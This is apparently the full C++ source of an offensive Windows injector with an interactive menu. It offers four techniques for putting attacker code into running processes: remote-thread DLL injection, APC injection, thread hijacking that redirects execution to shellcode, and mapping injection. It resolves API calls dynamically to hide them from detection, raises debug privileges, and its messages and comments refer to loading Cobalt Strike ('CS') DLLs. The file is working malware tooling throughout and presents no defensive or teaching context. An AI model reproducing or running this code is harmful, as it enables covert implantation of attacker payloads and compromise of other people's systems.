#include<iostream>
#include<tchar.h>
#include<Windows.h>
#include<Tlhelp32.h>
#include  "def.h"
using namespace std;

typedef struct Initialization
{	
	Fn_CreateFileMappingW		Hide_CreateFileMappingW;
	Fn_ResumeThread				Hide_ResumeThread;
	Fn_SetThreadContext         Hide_SetThreadContext;
	Fn_GetThreadContext			Hide_GetThreadContext;
	Fn_SuspendThread			Hide_SuspendThread;
	Fn_CreateToolhelp32Snapshot Hide_CreateToolhelp32Snapshot;
	Fn_OpenThread				Hide_OpenThread;
	FN_CreateRemoteThread		Hide_CreateRemoteThread;
	Fn_ReadFile					Hide_ReadFile;
	Fn_GetFileSize				Hide_GetFileSize;
	Fn_CreateFileW				Hide_CreateFileW;
	Fn_OpenProcess				Hide_OpenProcess;
	Fn_QueueUserAPC				Hide_QueueUserAPC;
	Fn_VirtualAllocEx           Hide_VirtualAllocEx;
	Fn_WriteProcessMemory		Hide_WriteProcessMemory;
	Fn_MapViewOfFile            Hide_MapViewOfFile;
	Fn_WaitForSingleObject      Hide_WaitForSingleObject;
	Fn_CreateThread             Hide_CreateThread;

}Initialization;

Initialization func = { 0 };

BOOL Win32()
{
	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
	func.Hide_CreateThread				= (Fn_CreateThread)GetProcAddress(hKernel32, "CreateThread");
	func.Hide_WaitForSingleObject		= (Fn_WaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");
	func.Hide_CreateFileMappingW		= (Fn_CreateFileMappingW)GetProcAddress(hKernel32, "CreateFileMappingW");
	func.Hide_ResumeThread				= (Fn_ResumeThread)GetProcAddress(hKernel32, "ResumeThread");
	func.Hide_SetThreadContext			= (Fn_SetThreadContext)GetProcAddress(hKernel32, "SetThreadContext");
	func.Hide_GetThreadContext			= (Fn_GetThreadContext)GetProcAddress(hKernel32, "GetThreadContext");
	func.Hide_SuspendThread				= (Fn_SuspendThread)GetProcAddress(hKernel32, "SuspendThread");
	func.Hide_CreateToolhelp32Snapshot  = (Fn_CreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
	func.Hide_OpenThread				= (Fn_OpenThread)GetProcAddress(hKernel32, "OpenThread");
	func.Hide_CreateRemoteThread		= (FN_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");
	func.Hide_ReadFile					= (Fn_ReadFile)GetProcAddress(hKernel32, "ReadFile");
	func.Hide_GetFileSize				= (Fn_GetFileSize)GetProcAddress(hKernel32, "GetFileSize");
	func.Hide_CreateFileW				= (Fn_CreateFileW)GetProcAddress(hKernel32, "CreateFileW");
	func.Hide_OpenProcess				= (Fn_OpenProcess)GetProcAddress(hKernel32, "OpenProcess");
	func.Hide_QueueUserAPC				= (Fn_QueueUserAPC)GetProcAddress(hKernel32, "QueueUserAPC");
	func.Hide_VirtualAllocEx			= (Fn_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
	func.Hide_WriteProcessMemory		= (Fn_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
	func.Hide_MapViewOfFile				= (Fn_MapViewOfFile)GetProcAddress(hKernel32, "MapViewOfFile");
	if (func.Hide_CreateFileMappingW && func.Hide_CreateFileW && func.Hide_CreateRemoteThread && func.Hide_CreateToolhelp32Snapshot && func.Hide_GetFileSize &&
		func.Hide_GetThreadContext && func.Hide_OpenProcess && func.Hide_OpenThread && func.Hide_QueueUserAPC && func.Hide_ReadFile && func.Hide_ResumeThread &&
		func.Hide_SetThreadContext && func.Hide_SuspendThread && func.Hide_VirtualAllocEx && func.Hide_WriteProcessMemory)
		return TRUE;
	else
		return FALSE;
}


BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	BOOL fOk = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOk;
}

DWORD GetProcessPID(LPCTSTR lpProcessName)
{
	DWORD Ret = 0;
	PROCESSENTRY32 p32;
	HANDLE lpSnapshot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (lpSnapshot == INVALID_HANDLE_VALUE)
	{
		return Ret;
	}
	p32.dwSize = sizeof(PROCESSENTRY32);
	::Process32First(lpSnapshot, &p32);
	do {
		if (!lstrcmp(p32.szExeFile, lpProcessName))
		{
			Ret = p32.th32ProcessID;
			break;
		}
	} while (::Process32Next(lpSnapshot, &p32));
	::CloseHandle(lpSnapshot);
	return Ret;
}

void APCInject(DWORD pid, LPCWSTR dllpath)
{
	//1.获取句柄
	HANDLE TargetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
	if (TargetHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
	}

	//2.远程申请内存
	DWORD length = (wcslen(dllpath) + 2) * sizeof(TCHAR);
	PVOID RemoteMemory = func.Hide_VirtualAllocEx(TargetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (RemoteMemory == NULL)
	{
		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
	}
	//3.将上线的DLL的路径写入内存

	BOOL WriteStatus = func.Hide_WriteProcessMemory(TargetHandle, RemoteMemory, dllpath, length, NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
	}
	//4.获取LoadLibrary的函数地址
	FARPROC LoadLibraryAddress = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
	if (LoadLibraryAddress == NULL)
	{
		cout << "	[-] Get LoadLibrary's Address Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Get LoadLibrary's Address Successfully :)" << endl;
	}
	//5.创建线程快照并且插入APC函数
	HANDLE SnapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (SnapShot == INVALID_HANDLE_VALUE)
	{
		cout << "	[-] Taking Thread Snap Shot Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Taking Thread Snap Shot Successfully :)" << endl;
	}
	//定义线程信息结构体,并且初始化
	THREADENTRY32 te = { 0 };
	te.dwSize = sizeof(te);
	//然后就是遍历快照中的线程,进行插入
	int flag = 0;                  //判断APC是否插入成功
	HANDLE ThreadHandle = NULL;    //用于获取目标线程句柄
	if (Thread32First(SnapShot, &te))
	{
		//不想do while循环,所以我就直接先进行一次
		//判断目标线程的进程ID是否是我们要注入的进程的ID
		if (te.th32OwnerProcessID == pid)
		{
			ThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);  //获取目标线程的句柄
			if (ThreadHandle)
			{
				DWORD dwRet = func.Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);  //插入APC函数
				if (dwRet == TRUE)
				{
					flag++;
				}
			}
			ThreadHandle = NULL;  //清除句柄
		}

		while (Thread32Next(SnapShot, &te))  //遍历完毕就会停止
		{
			if (te.th32OwnerProcessID == pid)
			{
				ThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
				if (ThreadHandle)
				{
					DWORD dwRet = func.Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
					if (dwRet == TRUE)
					{
						flag++;
					}
				}
				ThreadHandle = NULL;  
			}
		}
		CloseHandle(TargetHandle);
		CloseHandle(SnapShot);
		CloseHandle(ThreadHandle);
		if (flag == 0)
		{
			cout << "	[-] APC Inject Failed :(" << endl;
			return;
		}
		else
		{
			cout << "	[+] APC Inj&ct Successfully !! Enj0y Hacking Time :) !" << endl;
		}
	}
}

void RemoteThreadHiJacking(DWORD targetPID, LPCWSTR binPath)
{
	unsigned char* tempbuffer = NULL;
	DWORD          fileLength = 0;
	HANDLE         fileHandle = NULL;
	fileHandle = func.Hide_CreateFileW(binPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	fileLength = func.Hide_GetFileSize(fileHandle, NULL);

	tempbuffer = (unsigned char*)malloc(fileLength);
	func.Hide_ReadFile(fileHandle, tempbuffer, fileLength, NULL, NULL);

	DWORD resumeCount = 0;
	DWORD suspendCount = 0;
	HANDLE targetProcessHandle;
	unsigned char* remoteShellCodeBuffer;
	HANDLE targetThreadHandle = NULL;
	HANDLE snapShot;
	THREADENTRY32 t32;
	CONTEXT ThreadCtx;
	ThreadCtx.ContextFlags = CONTEXT_FULL;
	t32.dwSize = sizeof(THREADENTRY32);

	targetProcessHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	remoteShellCodeBuffer = (unsigned char*)func.Hide_VirtualAllocEx(targetProcessHandle, NULL, sizeof(tempbuffer), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	func.Hide_WriteProcessMemory(targetProcessHandle, remoteShellCodeBuffer, tempbuffer, fileLength, NULL);

	snapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapShot, &t32);

	while (Thread32Next(snapShot, &t32))
	{
		if (t32.th32OwnerProcessID == targetPID)
		{
			targetThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, t32.th32ThreadID);
			break;
		}
	}
	func.Hide_SuspendThread(targetThreadHandle);
	if (suspendCount == (DWORD)-1)
	{
		cout << "	[-]Suspend Target Thread Failed :(" << endl;
		goto end;
	}
	else
	{
		cout << "	[+] Suspend Target Thread Successfully :)" << endl;
	}
	if (!func.Hide_GetThreadContext(targetThreadHandle, &ThreadCtx))
	{
		cout << "	[-]Get Target Thread Context Failed :(" << endl;
		goto end;
	}
	else
	{
		cout << "	[+] Get Target Thread Successfully :)" << endl;
	}
	ThreadCtx.Rip = (DWORD_PTR)remoteShellCodeBuffer;
	if (!func.Hide_SetThreadContext(targetThreadHandle, &ThreadCtx))
	{
		cout << "	[-]Set Target Thread Context Failed :(";
		goto end;
	}
	else
	{
		cout << "	[+] Set Target Thread Context Successfully :)" << endl;
	}
	resumeCount = func.Hide_ResumeThread(targetThreadHandle);
	if (resumeCount == (DWORD)-1) {
		cout << "	[-] Resume Target Thread Failed :(" << endl;
	}
	else
	{
		cout << "	[+] Resume Target Thread Successfully :)" << endl;
	}
	cout << "	[+] Remote Thread HiJa&king Successfully ! Enj0y Hacking Time :)" << endl;
end:
	CloseHandle(snapShot);
	CloseHandle(targetProcessHandle);
	CloseHandle(targetThreadHandle);
}

BOOL TraverseProcess(LPCWSTR ProcessName)
{
	int cnt = 0;
	HANDLE snapShot;
	PROCESSENTRY32 p32 = { 0 };
	p32.dwSize = sizeof(PROCESSENTRY32);

	snapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	Process32First(snapShot, &p32);

	cout << "	[+] Below Are The Process PID :) " << endl;
	do {

		if (!lstrcmp(p32.szExeFile, (LPCWSTR)ProcessName)) {
			cnt++;
			cout << p32.th32ProcessID << endl;
		}
	} while (Process32Next(snapShot, &p32));

	if (cnt == 0)
	{
		cout << "	[-] Process PID Not Found :(" << endl;
		return FALSE;
	}
	cout << "	[+] Which Thread's PID Do You Wanna HiJack :)" << endl;
	cout << "	[!] This May Cause Process Collapse , Watch Out [!]" << endl;

	return TRUE;
}

void MappingInject(LPCWSTR assistFile, LPCWSTR binFile)
{
	PVOID    fileBuffer = NULL;
	DWORD    fileSize = 0;
	PVOID    pMapAddress = NULL;
	HANDLE   fileHandle = INVALID_HANDLE_VALUE;
	HANDLE   tempHandle = INVALID_HANDLE_VALUE;
	HANDLE   mapAddressHandle = INVALID_HANDLE_VALUE;
	

	
	fileHandle = func.Hide_CreateFileW(binFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE )
		goto END;
	fileSize = func.Hide_GetFileSize(fileHandle, NULL);
	if (fileSize == 0)
		goto END;
	fileBuffer = malloc(fileSize);
	if (fileBuffer == NULL)
		goto END;
	if (!func.Hide_ReadFile(fileHandle, fileBuffer, fileSize, NULL, NULL))
		goto END;
	cout << "	[+] Read Bin File Into Memory Successfully :)" << endl;

	tempHandle = func.Hide_CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, fileSize, NULL);
	if (tempHandle == INVALID_HANDLE_VALUE)
	{
		cout << "	[-] Create Mapping Object Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Create Mapping Object Successfully :)" << endl;

	pMapAddress = func.Hide_MapViewOfFile(tempHandle, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, fileSize);
	if (pMapAddress == NULL)
	{
		cout << "	[-] Mapping Memory Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Mapping Memory Successfully :)" << endl;

	memcpy(pMapAddress, fileBuffer, fileSize);
		
	mapAddressHandle = func.Hide_CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pMapAddress, NULL, NULL, NULL);
	if (mapAddressHandle == INVALID_HANDLE_VALUE)
	{
		cout << "	[-] Create Mapping Memory Thread Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Create Mapping Memory Thread Successfully :)" << endl;

	cout << "	[+] Mapping Inject Successfully !! Enj0y Hacking Time :) !" << endl;
	func.Hide_WaitForSingleObject(mapAddressHandle, INFINITE);
	CloseHandle(fileHandle);
	CloseHandle(tempHandle);
	CloseHandle(mapAddressHandle);
	return;
END:
	CloseHandle(fileHandle);
	CloseHandle(tempHandle);
	CloseHandle(mapAddressHandle);
}

void DLLInject(DWORD pid, LPCWSTR dllpath)
{
	//1.获取句柄

	HANDLE OriginalProcessHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (OriginalProcessHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;

		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
	}
	//2.远程申请内存
	DWORD  length = (wcslen(dllpath) + 1) * sizeof(TCHAR);

	PVOID  RemoteMemory = func.Hide_VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);

	if (RemoteMemory == NULL)
	{

		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
	}
	//3.将CS上线的DLL写入内存
	BOOL WriteStatus = func.Hide_WriteProcessMemory(OriginalProcessHandle, RemoteMemory, dllpath, length, NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
	}

	//4.获取LoadLibrary地址
	FARPROC LoadLibraryHandle = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	//5.声明ZwCreateThreadEx函数
#ifdef _WIN64
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);
#endif
	//6.获取NTDLL中ZwCreateThreadEx函数
	typedef_ZwCreateThreadEx  ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwCreateThreadEx");
	if (ZwCreateThreadEx == NULL)
	{
		cout << "	[-] Get ZwCreateThreadEx Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] Get ZwCreateThreadEx Address Successfully :)" << endl;
	}
	//5.创建线程 ring3调用CreateRemoteThread
	HANDLE RemoteHandle = func.Hide_CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, NULL);
	if (RemoteHandle == NULL)
	{
		cout << "	[-] Ring3 Thread Inject Failed :(" << endl;
		return;

	}
	else {
		cout << "	[+] Ring3 Thread Inject Successfully :)" << endl;
	}

	//7.创建线程  ring0调用ZwCreateThreadEx
	HANDLE hRemoteThread;
	DWORD Status = 0;
	Status = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, OriginalProcessHandle, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, 0, 0, 0, NULL);
	if (Status == NULL)
	{
		cout << "	[+] Ring0 Thread Inject Successfully :)" << endl;
	}
	else
	{
		cout << "	[-] Ring0 Thread Inject Failed :(" << endl;
		return;
	}
	func.Hide_WaitForSingleObject(RemoteHandle, -1);
	//8.释放DLL空间
	VirtualFreeEx(OriginalProcessHandle, RemoteMemory, length, MEM_COMMIT);
	//9.关闭句柄
	CloseHandle(OriginalProcessHandle);
	CloseHandle(ZwCreateThreadEx);
	cout << "	[+] DLL inj&ct successfu11y !! Enj0y Hacking Time :) !" << endl;
}

void Banner(int type)
{
	if (type == 1)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE);
		std::cout << "________  .____    .____      .___            __               __   \n"
			"\\______ \\ |    |   |    |     |   | ____     |__| ____   _____/  |_ \n"
			" |    |  \\|    |   |    |     |   |/    \\    |  |/ __ \\_/ ___\\   __\\\n"
			" |    `   \\    |___|    |___  |   |   |  \\   |  \\  ___/\\  \\___|  |  \n"
			"/_______  /_______ \\_______ \\ |___|___|  /\\__|  |\\___  >\\___  >__|  \n"
			"        \\/        \\/       \\/          \\/\\______|    \\/     \\/      \n";

		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	else if (type == 2)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
		std::cout << "   _____ ___________________   .___            __               __   \n"
			"  /  _  \\\\______   \\_   ___ \\  |   | ____     |__| ____   _____/  |_ \n"
			" /  /_\\  \\|     ___/    \\  \\/  |   |/    \\    |  |/ __ \\_/ ___\\   __\\\n"
			"/    |    \\    |   \\     \\____ |   |   |  \\   |  \\  ___/\\  \\___|  |  \n"
			"\\____|__  /____|    \\______  / |___|___|  /\\__|  |\\___  >\\___  >__|  \n"
			"        \\/                 \\/           \\/\\______|    \\/     \\/      \n";

		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	else if (type == 3)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
		std::cout << "                              __________                       __                                                \n"
			"                              \\______   \\ ____   _____   _____/  |_  ____                                       \n"
			"                               |       _// __ \\ /     \\ /  _ \\   __\\/ __ \\                                      \n"
			"                               |    |   \\  ___/|  Y Y  (  <_> )  | \\  ___/                                      \n"
			"                               |____|_  /\\___  >__|_|  /\\____/|__|  \\___  >                                     \n"
			"                                      \\/     \\/      \\/                 \\/                                      \n"
			"__________.__                              .___   ___ ___ .__     ____.              __   .__.__                \n"
			"\\______   \\  |_________   ____ _____     __| _/  /   |   \\|__|   |    |____    ____ |  | _|__|__| ____    ____  \n"
			" |       _/  |  \\_  __ \\_/ __ \\\\__  \\   / __ |  /    ~    \\  |   |    \\__  \\ _/ ___\\|  |/ /  |  |/    \\  / ___\\ \n"
			" |    |   \\   Y  \\  | \\/\\  ___/ / __ \\_/ /_/ |  \\    Y    /  /\\__|    |/ __ \\  \\___|    <|  |  |   |  \\/ /_/  >\n"
			" |____|_  /___|  /__|    \\___  >____  /\\____ |   \\___|_  /|__\\________(____  /\\___  >__|_ \\__|__|___|  /\\___  / \n"
			"        \\/     \\/            \\/     \\/      \\/         \\/                  \\/     \\/     \\/          \\/ /_____/\n";

		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	else if(type == 4)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
		std::cout << "    _____                       .__                 .___            __               __   \n";
		std::cout << "  /     \\ _____  ______ ______ |__| ____    ____   |   | ____     |__| ____   _____/  |_\n";
		std::cout << " /  \\ /  \\\\__  \\ \\____ \\\\____ \\|  |/    \\  / ___\\  |   |/    \\    |  |/ __ \\_/ ___\\   __\\\n";
		std::cout << "/    Y    \\/ __ \\|  |_> >  |_> >  |   |  \\/ /_/  > |   |   |  \\   |  \\  ___/\\  \\___|  |  \n";
		std::cout << "\\____|__  (____  /   __/|   __/|__|___|  /\\___  /  |___|___|  /\\__|  |\\___  >\\___  >__|  \n";
		std::cout << "        \\/     \\/|__|   |__|           \\/     \\/            \\/\\______|    \\/     \\/       \n";
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl << "	          Color Picked By Icy Water :)" << endl;
	if (EnableDebugPrivilege() == TRUE)
	{

		cout << "-----------------------------!!START!!--------------------------------" << endl;
		cout << "	[+] Privilege Elevated Successfully, Now You Have Bypassed UAC :) " << endl;
	}
	else {
		cout << "-----------------------------!!START!!--------------------------------" << endl;
		cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
	}
	if (Win32())
		cout << "	[+] Dynamic Call Successfully :)" << endl;
	else
		cout << "	[-] Dynamic Call Failed :(" << endl;
}

void TrashData()
{
	int* data = (int*)malloc(70000 * sizeof(int));
	for (int i = 0; i < 70000; i++)
	{
		data[i] = i;

	}
	for (int i = 0; i < 70000; i++)
	{
		printf("%d", data[i]);
	}
	std::cout << "\033[2J\033[1;1H";
}

int _tmain(int argc, TCHAR* argv[])
{
	if (argc == 3) {
		cout << "	Which kind of Injection do you want?" << endl;
		cout << "	[1]: DLLInject" << endl << "	[2]: APCInject" << endl;
		cout << "	[3]: ThreadHiJacking" << endl << "	[4]: MappingInject" << endl;
		int type = 0;
		cin >> type;
		Banner(type);
		if (type == 1) //DLLInject
		{
			DWORD PID = GetProcessPID(argv[1]);
			DLLInject(PID, argv[2]);
		}
		else if (type == 2)  //APCInject
		{
			DWORD PID = GetProcessPID(argv[1]);
			APCInject(PID, argv[2]);

		}
		else if (type == 3)   //ThreadHiJacking 
		{
			if (!TraverseProcess(argv[1]))
				return 0;
			DWORD ProcessPID;
			cin >> ProcessPID;
			RemoteThreadHiJacking(ProcessPID, argv[2]);
		}
		else if (type == 4)  //Mapping Inject 
		{
			MappingInject(argv[1], argv[2]);
		}
		else {
			TrashData();
			cout << "	[-] Please choose the number below :(" << endl;
			return 0;
		}
	}
	else
	{
		TrashData();
		cout << "	[-] Two Parameters are required" << endl;
		return 0;
	}

	return 0;
}